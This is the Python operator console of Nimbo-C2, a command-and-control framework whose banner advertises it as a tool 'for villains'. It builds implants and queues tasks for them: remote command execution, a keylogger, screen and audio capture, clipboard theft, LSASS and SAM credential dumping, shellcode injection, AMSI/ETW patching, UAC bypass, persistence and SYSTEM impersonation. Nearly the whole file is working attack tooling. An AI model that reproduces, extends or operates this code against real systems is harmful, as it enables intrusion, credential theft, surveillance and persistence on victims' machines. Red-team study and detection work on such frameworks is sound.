from server import utils
from server import listener
from server import ps_modules

import os
import re
import sys
import json
import shlex
import subprocess
from tabulate import tabulate
from collections import OrderedDict
from jsonc_parser.parser import JsoncParser
from prompt_toolkit import PromptSession
from prompt_toolkit.output import ColorDepth
from prompt_toolkit.completion import NestedCompleter
from prompt_toolkit.patch_stdout import patch_stdout
from prompt_toolkit.formatted_text import FormattedText


banner = """

    ███    ██ ██ ███    ███ ██████   ██████                 ██████ ██████  
    ████   ██ ██ ████  ████ ██   ██ ██    ██               ██           ██ 
    ██ ██  ██ ██ ██ ████ ██ ██████  ██    ██     █████     ██       █████  
    ██  ██ ██ ██ ██  ██  ██ ██   ██ ██    ██               ██      ██      
    ██   ████ ██ ██      ██ ██████   ██████                 ██████ ███████ 
    
    >> Lightweight C2 Framework for villains :)
       https://github.com/itaymigdal/Nimbo-C2
       By Itay Migdal
       
            +-
            -@=           .........              *-
    +*++-:.  :@-   . ..-=*##+.::.:++=-:..       #*   .-=++:
    :=**####*=*@::-:-+%@@@%#+:::.-##@@%*=:..   *#.=*%%%#+-
       :-+*#%%%*==-*@@%*=-::::::::--=*#@@%+-:.+@##*=:.
      .---::...==:+%#=--::::::::::::::-=+%@%-:-****+=.
              .=-:::--.     :::::::.  .:--=-:::     .
              :=-::--  -*##: ::::. -==. .=:::::
              :=-::=. -%%%:  .-:. #@@@*. :=:::.
              :=-:-=  +@++=. .-- =@#++   .=:::.
              :=-::=: .*%%%- -:- .%%##-  -=:::
              .=-::-=:  ..  --:-: .-=:  :=--::
              .=--==---::::-------.   :-=--::-
              -=--*-.----------------------::-.
             .===--++*#++=---:::-:----=----:--:
             -===--=:*%%%%%%#**--+=..+=----::.-.
             =.:+---:=*####%#=%%##+.:---==::: ::
            :: .===------===-.---:------+=:-.  :
           .-   ==++-===-----=----------==-:.  .:
        :--=-   :==+=--------------------+--.   -:::.
         .       -======----------------==--:
                 .========================---
                  .======-:..   ..::-=======-
                   .===:              .:-====.
                  ..-=.                  .:-=-...
     ...........:---:..................:....:----:................
     
    """


# parse config
config = JsoncParser.parse_file("config.jsonc")
log_file = config["c2"]["logging"]["log_file"]
is_save_agents_on_exit = config["c2"]["save_agents_data"]["save_on_exit"]
agents_file_path = config["c2"]["save_agents_data"]["save_path"]
agent_prompt_color = config["c2"]["prompt"]["agent_prompt_color"]
nimbo_prompt_color = config["c2"]["prompt"]["nimbo_prompt_color"]
start_listener_on_start = config["c2"]["general"]["start_listener_on_start"]
collect_folder = config["c2"]["general"]["collect_folder"]

user_agent_pattern = r"[0-9a-f]{8}"
main_prompt_text = FormattedText([(f"fg:{nimbo_prompt_color}", "Nimbo-C2 > ")])
agent_prompt_text = FormattedText([(f"fg:{nimbo_prompt_color}", "Nimbo-C2 "),
                                   (f"fg:{agent_prompt_color}", "[AGENT-ID]"), ("", " > ")])


command_registry = OrderedDict()


class Command:
    def __init__(self, name, handler, help, category, target, autocomplete_args, elevated):
        self.name = name
        self.handler = handler
        self.help = help
        self.category = category
        self.target = target
        self.autocomplete_args = autocomplete_args or []
        self.elevated = elevated

    def run(self, *args):
        return self.handler(*args)


def provide_ps_module(ps_module):
    powershell_command = getattr(ps_modules, ps_module)
    encoded_powershell_command = utils.encode_base_64(powershell_command)
    command_dict = {
        "command_type": "iex",
        "ps_module": ps_module,
        "encoded_powershell_command": encoded_powershell_command
    }
    return command_dict


def register_command(name, help, category, target, autocomplete_args=None, elevated=False):
    def wrapper(handler):
        def wrapped_handler(*args):
            command_dict = {"command_type": name}
            return handler(*args, command_dict)
        command_registry[name] = Command(name, wrapped_handler, help, category, target, autocomplete_args, elevated)
        return handler
    return wrapper


@register_command("cmd", "Execute a command", "Send Commands", "All", ["<cmdline>"])
def handler_cmd(command, command_dict):
    command_dict["command"] = command
    return command_dict

@register_command("iex", "Execute in-memory powershell command", "Send Commands", "Windows", ["<powershell-command>"])
def handler_iex(ps_command, command_dict):
    command_dict["epc"] = utils.encode_base_64(ps_command)
    return command_dict

@register_command("spawn", "Spawn new process using WMI win32_process class", "Send Commands", "Windows", ["<cmdline>"])
def handler_spawn(cmdline, command_dict):
    command_dict["cmdline"] = cmdline
    return command_dict

@register_command("download", "Download a file from the agent", "File Stuff", "All", ["<remote-path>"])
def handler_download(remote_path, command_dict):
    command_dict["src"] = remote_path
    return command_dict

@register_command("upload", "Upload a file to the agent", "File Stuff", "All", ["<local-path>", "<remote-path>"])
def handler_upload(local_path, remote_path, command_dict):
    local_file_content = utils.read_file(local_path)
    command_dict["src_b64"] = utils.encode_base_64(local_file_content, encoding="utf-8")
    command_dict["dst"] = remote_path
    return command_dict

@register_command("listdir", "List a directory (R for recurse)", "File Stuff", "All", ["<path>", "<R|0>"])
def handler_upload(path, is_recurse, command_dict):
    command_dict["path"] = path
    if is_recurse == "R":
        command_dict["rec"] = True
    elif is_recurse == "0":
        command_dict["rec"] = False
    else:
        utils.log_message("Use R or 0 (for recurse flag)", print_time=False)
        return False
    return command_dict

@register_command("fread", "Read a file", "File Stuff", "All", ["<path>"])
def handler_upload(path, command_dict):
    command_dict["path"] = path
    return command_dict

@register_command("fwrite", "Write/Append a file", "File Stuff", "All", ["<path>", "<W|A>", "<content>"])
def handler_upload(path, mode, content, command_dict):
    command_dict["path"] = path
    command_dict["content"] = content
    if mode == "W":
        command_dict["append"] = False
    elif mode == "A":
        command_dict["append"] = True
    else:
        utils.log_message("Use W or A (for write or append)", print_time=False)
        return False
    return command_dict 

@register_command("fdelete", "Delete a file", "File Stuff", "All", ["<path>"])
def handler_upload(path, command_dict):
    command_dict["path"] = path
    return command_dict

@register_command("regenumkeys", "Enum Registry subkeys", "Registry Stuff", "Windows", ["<key-path>"])
def handler_regenumkeys(reg_key, command_dict):
    command_dict["key"] = reg_key
    return command_dict

@register_command("regenumvalues", "Enum Registry values", "Registry Stuff", "Windows", ["<key-path>"])
def handler_regenumvalues(reg_key, command_dict):
    command_dict["key"] = reg_key
    return command_dict

@register_command("regread", "Read registry value", "Registry Stuff", "Windows", ["<key-path>", "<value>"])
def handler_regread(reg_key, value, command_dict):
    command_dict["key"] = reg_key
    command_dict["value"] = value
    return command_dict

@register_command("regdeletekey", "Delete registry key", "Registry Stuff", "Windows", ["<key-path>"])
def handler_regdeletekey(reg_key, command_dict):
    command_dict["key"] = reg_key
    return command_dict

@register_command("regdeletevalue", "Delete registry value", "Registry Stuff", "Windows", ["<key-path>", "<value>"])
def handler_regdeletevalue(reg_key, value, command_dict):
    command_dict["key"] = reg_key
    command_dict["value"] = value
    return command_dict

@register_command("regwritekey", "Write registry key", "Registry Stuff", "Windows", ["<key-path>"])
def handler_regwritekey(reg_key, command_dict):
    command_dict["key"] = reg_key
    return command_dict

@register_command("regwritevalue", "Write registry value (supports string or dword)", "Registry Stuff", "Windows", ["<key-path>", "<value>", "<data>", "<d|s>"])
def handler_regwritevalue(reg_key, value, data, type, command_dict):
    command_dict["key"] = reg_key
    command_dict["value"] = value
    if type == "d":
        data = int(data)
    command_dict["data"] = data
    command_dict["type"] = type
    return command_dict

@register_command("pstree", "Show process tree", "Discovery Stuff", "Windows")
def handler_pstree(command_dict):
    return provide_ps_module(command_dict["command_type"])

@register_command("checksec", "Enum security products", "Discovery Stuff", "Windows")
def handler_checksec(command_dict):
    return command_dict

@register_command("software", "Enum installed software", "Discovery Stuff", "Windows")
def handler_software(command_dict):
    return provide_ps_module(command_dict["command_type"])

@register_command("windows", "Enum visible windows", "Discovery Stuff", "Windows")
def handler_windows(command_dict):
    return command_dict

@register_command("modules", "Enum process loaded modules (exclude Microsoft Dlls)", "Discovery Stuff", "Windows")
def handler_modules(command_dict):
    return provide_ps_module(command_dict["command_type"])

@register_command("modules_full", "Enum process loaded modules (include Microsoft Dlls)", "Discovery Stuff", "Windows")
def handler_modules_full(command_dict):
    return provide_ps_module(command_dict["command_type"])

@register_command("clipboard", "Retrieve clipboard", "Collection Stuff", "Windows")
def handler_clipboard(command_dict):
    return command_dict

@register_command("screenshot", "Retrieve screenshot", "Collection Stuff", "Windows")
def handler_screenshot(command_dict):
    return command_dict

@register_command("audio", "Record audio", "Collection Stuff", "Windows", ["<record-time>"])
def handler_audio(seconds, command_dict):
    command_dict["time"] = seconds
    return command_dict

@register_command("keylog", "Start/dump/stop keylogger", "Collection Stuff", "Windows", ["<start|dump|stop>"])
def handler_keylog(subcommand, command_dict):
    command_dict["subcommand"] = subcommand
    return command_dict

@register_command("lsass", "Lsass operations (examine or dump)", "Post Exploitation Stuff", "Windows", ["<examine|direct|comsvcs|eviltwin>"], True)
def handler_lsass(subcommand, command_dict):
    command_dict["subcommand"] = subcommand
    return command_dict

@register_command("samdump", "Dump SAM hashes using inline PowerDump.ps1", "Post Exploitation Stuff", "Windows", [], True)
def handler_samdump(command_dict):
    return provide_ps_module(command_dict["command_type"])

@register_command("shellc", "Inject shellcode using indirect syscalls", "Post Exploitation Stuff", "Windows", ["<raw-shellcode-file>", "<pid>"])
def handler_shellc(shellcode_path, pid, command_dict):
    shellc_file_content = utils.read_file(shellcode_path)
    if not shellc_file_content:
        return False
    shellc_base64 = utils.encode_base_64(shellc_file_content, encoding="utf-8")
    command_dict["sh_b64"] = shellc_base64
    command_dict["pid"] = int(pid)
    return command_dict

@register_command("assembly", "Execute inline .NET assembly", "Post Exploitation Stuff", "Windows", ["<assembly-file>", "<args>"])
def handler_assembly(assembly_path, args, command_dict):
    assembly_file_content = utils.read_file(assembly_path)
    if not assembly_file_content:
        return False
    assembly_base64 = utils.encode_base_64(assembly_file_content)
    command_dict["as_b64"] = assembly_base64
    command_dict["as_args"] = args
    return command_dict

@register_command("patch", "Patch AMSI/ETW", "Evasion Stuff", "Windows", ["<amsi|etw>"])
def handler_patch(target, command_dict):
    command_dict["func"] = target
    return command_dict

@register_command("persist-run", "Persist using Run key (will try HKLM, then HKCU)", "Persistence Stuff", "Windows", ["<command>", "<keyname>"])
def handler_persist(command, keyname, command_dict):
    command_dict["cmd"] = command
    command_dict["key"] = keyname
    return command_dict

@register_command("persist-spe", "Persist using Silent Process Exit technique", "Persistence Stuff", "Windows", ["<command>", "<process-name>"], True)
def handler_persist(command, process_name, command_dict):
    command_dict["cmd"] = command
    command_dict["pn"] = process_name
    return command_dict

@register_command("uac", "UAC bypass", "Privesc Stuff", "Windows", ["<fodhelper|sdclt>", "<command>"])
def handler_uac(method, command, command_dict):
    command_dict["method"] = method
    command_dict["cmd"] = command
    return command_dict

@register_command("getsys", "Impersonate SYSTEM", "Privesc Stuff", "Windows")
def handler_getsys(command_dict):
    return command_dict

@register_command("impersonate", "Impersonate another user", "Privesc Stuff", "Windows")
def handler_impersonate(pid, command_dict):
    command_dict["pid"] = int(pid)
    return command_dict

@register_command("rev2self", "Revert to self", "Privesc Stuff", "Windows")
def handler_getsys(command_dict):
    return command_dict

@register_command("msgbox", "Pop a message box in a new thread", "Interaction stuff", "Windows", ["<title>", "<text>"])
def handler_msgbox(title, text, command_dict):
    command_dict["title"] = title
    command_dict["text"] = text
    return command_dict

@register_command("speak", "Speak a string using the microphone", "Interaction stuff", "Windows", ["<text>"])
def handler_speak(text, command_dict):
    command_dict["text"] = text
    return command_dict

@register_command("critical", "Set process critical (BSOD on termination)", "Misc Stuff", "Windows", ["<true/false>"], True)
def handler_critical(critical_flag, command_dict):
    command_dict["is_critical"] = critical_flag
    return command_dict

@register_command("sleep", "Change sleep time interval and jitter", "Communication Stuff", "All", ["<sleep-time>", "<jitter-%>"])
def handler_sleep(sleep_time, jitter, command_dict):
    command_dict["sleep"] = int(sleep_time)
    command_dict["jitter"] = int(jitter)
    return command_dict

@register_command("collect", "Recollect agent data", "Communication Stuff", "All")
def handler_collect(command_dict):
    return command_dict

@register_command("die", "Kill the agent", "Communication Stuff", "All")
def handler_die(command_dict):
    return command_dict

@register_command("memfd", "Load ELF in-memory using memfd_create syscall", "Post Exploitation Stuff", "Linux", ["<implant|task>", "<elf-file>", "<commandline>"])
def handler_memfd(mode, elf_path, commandline, command_dict):
    elf_file_content = utils.read_file(elf_path)
    if not elf_file_content:
        return False
    elf_base64 = utils.encode_base_64(elf_file_content, encoding="utf-8")
    command_dict["elf_b64"] = elf_base64
    command_dict["cmdline"] = commandline
    command_dict["mode"] = mode
    return command_dict


def enrich_agent_completer_dict(commands_dict):
    # function to enrich the agent completer
    commands_dict["keylog"] = dict.fromkeys(['start', 'dump','stop'])
    commands_dict["patch"] = dict.fromkeys(['amsi', 'etw'])
    commands_dict["uac"] = dict.fromkeys(['fodhelper', 'sdclt'])
    commands_dict["lsass"] = dict.fromkeys(['examine', 'direct', 'comsvcs', 'eviltwin'])
    commands_dict["critical"] = dict.fromkeys(['true', 'false'])
    commands_dict["memfd"] = dict.fromkeys(["task", "implant"])
    return commands_dict


def list_all_commands(target: str = "All"):

    target = target.lower() if target else None

    return [
        cmd.name
        for cmd in set(command_registry.values())
        if (
            target is None
            or cmd.target.lower() == target
            or cmd.target.lower() == "all"
            or target == "all"
        )
    ]


def print_agent_help(target: str = "All"):
    
    CATEGORY_ORDER = [
        "Send Commands",
        "File Stuff",
        "Registry Stuff",
        "Discovery Stuff",
        "Collection Stuff",
        "Post Exploitation Stuff",
        "Evasion Stuff",
        "Persistence Stuff",
        "Privesc Stuff",
        "Interaction Stuff",
        "Misc Stuff",
        "Communication Stuff"
    ]

    target = target.lower()

    categorized = OrderedDict((cat, []) for cat in CATEGORY_ORDER)

    for name, cmd in command_registry.items():
        cmd_target = cmd.target.lower()

        if target == "all":
            pass 
        elif cmd_target != "all" and cmd_target != target:
            continue  

        categorized.setdefault(cmd.category, []).append(cmd)

    for category, commands in categorized.items():
        if not commands:
            continue
        print(f"    --== {category} ==--")
        for cmd in commands:
            args = " ".join(cmd.autocomplete_args)
            padding = " " * max(1, 50 - len(cmd.name + " " + args))
            print(f"    {cmd.name} {args}{padding}->  {cmd.help}")
        print()
    sys.stdout.write("\033[F")  # Move cursor up one line
    sys.stdout.write("\033[K")  # Clear to end of line


def print_agent_help_general():
    agent_help_general = """
    --== General (Server only) ==--
    show                                              ->  Show agent details
    clear                                             ->  Clear pending tasks
    cls                                               ->  Clear the screen
    back                                              ->  Back to main screen
    help                                              ->  Print this help message
    exit                                              ->  Exit Nimbo-C2
    ! <command>                                       ->  Execute system command
    """
    print(agent_help_general)


def print_main_help():
    main_help = f"""
    --== Agent ==--
    agent list                    ->  List active agents
    agent interact <agent-id>     ->  Interact with the agent
    agent remove <agent-id>       ->  Remove agent data
    
    --== Builder ==--
    build exe                     ->  Build EXE agent (-h for help)
    build dll                     ->  Build DLL agent (-h for help)
    build elf                     ->  Build ELF agent (-h for help)

    --== Listener ==--
    listener start                ->  Start the listener
    listener stop                 ->  Stop the listener
    listener status               ->  Print the listener status
    
    --== General ==--
    cls                           ->  Clear the screen
    help                          ->  Print this help message
    exit                          ->  Exit Nimbo-C2
    ! <command>                   ->  Execute system command
    """

    print(main_help)


def print_agents(agent=None):

    agents = listener.agents

    if len(agents) == 0:
        print("[-] No active agents")
        return

    if agent:
        agents = {agent: agents[agent] for a in agents if a == agent}

    agent_table = {"Agent ID": [agent for agent in agents]}
    for p in [i for i in list(agents.values())[0]["info"]]:
        agent_table[p] = [agents[agent]["info"][p] for agent in agents if agents[agent]["info"].get(p)]

    utils.log_message(f"\n{tabulate(agent_table, headers='keys', tablefmt='grid')}\n", print_time=False)


def exit_nimbo():
    listener.listener_stop()
    if is_save_agents_on_exit:
        try:
            with open(agents_file_path, "wt") as f:
                json.dump(listener.agents, f)
            utils.log_message(f"Saved agent data")
        except Exception:
            utils.log_message(f"[-] Could not save agent data")

    exit()


def send_build_command(build_params):
    build_command = "python3 builder/build.py " + build_params
    try:    
        subprocess.run(build_command, shell=True)
    except:
        utils.log_message(f"[-] Stopping build", print_time=False)


def parse_common_command(command):
    if re.fullmatch(r"\s*cls\s*", command):
        utils.clear_screen()
        return True

    elif re.fullmatch(r"\s*exit\s*", command):
        raise KeyboardInterrupt

    elif re.fullmatch(r"\s*build\s+.*", command):
        build_params = re.sub(r"\s*build\s+", "", command, 1)
        send_build_command(build_params)
        return True

    elif re.fullmatch(r"\s*!.*", command):
        shell_command = re.sub(r"\s*!", "", command, 1)
        os.system(shell_command)
        return True
 
    elif re.fullmatch(r"\s*", command):
        return True

    else:
        return False


def agent_screen(agent_id, os):


    agent_commands = list_all_commands(target=os)
    agent_commands.extend(["clear", "show", "back", "help", "cls", "exit"])
    agent_completer_dict = {cmd: None for cmd in agent_commands}
    agent_completer_dict = enrich_agent_completer_dict(agent_completer_dict)
    agent_completer = NestedCompleter.from_nested_dict(agent_completer_dict)

    while True:
        with patch_stdout():
            command = session.prompt(eval(str(agent_prompt_text).replace("AGENT-ID", agent_id)),
                                        completer=agent_completer,
                                        complete_while_typing=False,
                                        color_depth=ColorDepth.TRUE_COLOR,
                                        wrap_lines=False)

        try:
            if re.fullmatch(r"\s*clear\s*", command):
                listener.agents[agent_id]["pending_commands"] = []
                continue

            elif re.fullmatch(r"\s*show\s*", command):
                print_agents(agent=agent_id)
                continue

            elif re.fullmatch(r"\s*back\s*", command):
                return

            elif re.fullmatch(r"\s*help\s*", command):
                print_agent_help(target=os)
                print_agent_help_general()
                continue
            
            elif parse_common_command(command):
                continue

            command_list = shlex.split(command)
            command_type = command_list[0]
            command = command_registry.get(command_type)
            if command:
                command_dict = command.handler(*command_list[1:])
                if command_dict:
                    listener.agents[agent_id]["pending_commands"] += [command_dict]
            else:
                raise Exception

        except Exception:
            print("[-] Could not parse command")
            continue


def main_screen():
    while True:
        agents_dict = dict.fromkeys(list(listener.agents.keys()))
        main_completer = NestedCompleter.from_nested_dict({
            'agent': {
                'list': None,
                'interact': agents_dict,
                'remove': agents_dict
            },
            'build': {
                'exe': None,
                'dll': None,
                'elf': None
            },
            'listener': {
                'start': None,
                'status': None,
                'stop': None
            },
            'cls': None,
            'help': None,
            'exit': None
        })
        with patch_stdout():
            command = session.prompt(main_prompt_text, completer=main_completer, complete_while_typing=False,
                                     color_depth=ColorDepth.TRUE_COLOR)

        if re.fullmatch(r"\s*agent\s+list\s*", command):
            print_agents()

        elif re.fullmatch(r"\s*agent\s+interact\s+" + user_agent_pattern, command):
            agent_id = re.split(r"\s+", command)[2]
            if "windows" in listener.agents[agent_id]["info"]["OS Version"].lower():
                agent_screen(agent_id, "Windows")
            else:
                agent_screen(agent_id, "Linux")

        elif re.fullmatch(r"\s*agent\s+remove\s+" + user_agent_pattern, command):
            agent_id = re.split(r"\s+", command)[2]
            listener.agents.pop(agent_id)

        elif re.fullmatch(r"\s*agent\s+list\s*", command):
            print_agents()

        elif re.fullmatch(r"\s*listener\s+start\s*", command):
            listener.listener_start()

        elif re.fullmatch(r"\s*listener\s+status\s*", command):
            listener.listener_status()

        elif re.fullmatch(r"\s*listener\s+stop\s*", command):
            listener.listener_stop()
        
        elif re.fullmatch(r"\s*help\s*", command):
            print_main_help()
        
        else:
            parse_common_command(command)


if __name__ == '__main__':
    try:
        # create prompt session
        session = PromptSession()
        # print Nimbo-C2 banner
        print(banner)
        # handle agents data loading
        if is_save_agents_on_exit:
            try:
                with open(agents_file_path, "rt") as f:
                    listener.agents = json.load(f)
                utils.log_message(f"Loaded agent data")
            except Exception:
                utils.log_message(f"[-] Could not load agent data")
        # handle listener starting
        if start_listener_on_start:
            listener.listener_start()
            utils.log_message(f"Listener started")
        # go to main screen
        main_screen()

    except KeyboardInterrupt:
        pass
    except Exception as e:
        utils.log_message("[-] Error: ", e)
    finally:
       exit_nimbo()